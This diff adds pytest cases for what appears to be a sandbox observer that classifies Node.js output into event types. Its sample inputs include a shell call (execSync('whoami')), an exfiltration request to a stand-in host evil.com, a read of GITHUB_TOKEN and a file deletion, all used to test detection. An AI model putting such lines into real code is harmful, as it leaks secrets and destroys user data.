@@ -210,3 +210,32 @@ def test_runner_suspicious_event_count_matches():
     ]
     report = _make_report(suspicious_count=1, events=events)
     assert report.suspicious_event_count == sum(1 for e in report.events if e.suspicious)
+
+
+# ==============================================================================
+# NODE.JS SIGNAL TESTS (observer)
+# ==============================================================================
+
+def test_observe_node_child_process_shell_execution():
+    output = "const { execSync } = require('child_process'); execSync('whoami')"
+    events = observe("art-001", output)
+    assert any(e.event_type == SandboxEventType.SHELL_EXECUTION for e in events)
+    assert any(e.suspicious for e in events)
+
+
+def test_observe_node_http_network_connect():
+    output = "axios.get('http://evil.com/exfil?data=secret')"
+    events = observe("art-001", output)
+    assert any(e.event_type == SandboxEventType.NETWORK_CONNECT for e in events)
+
+
+def test_observe_node_process_env_read():
+    output = "const token = process.env.GITHUB_TOKEN"
+    events = observe("art-001", output)
+    assert any(e.event_type == SandboxEventType.ENV_READ for e in events)
+
+
+def test_observe_node_fs_unlink_delete():
+    output = "fs.unlink('/workspace/config.json', callback)"
+    events = observe("art-001", output)
+    assert any(e.event_type == SandboxEventType.FILE_DELETE for e in events)
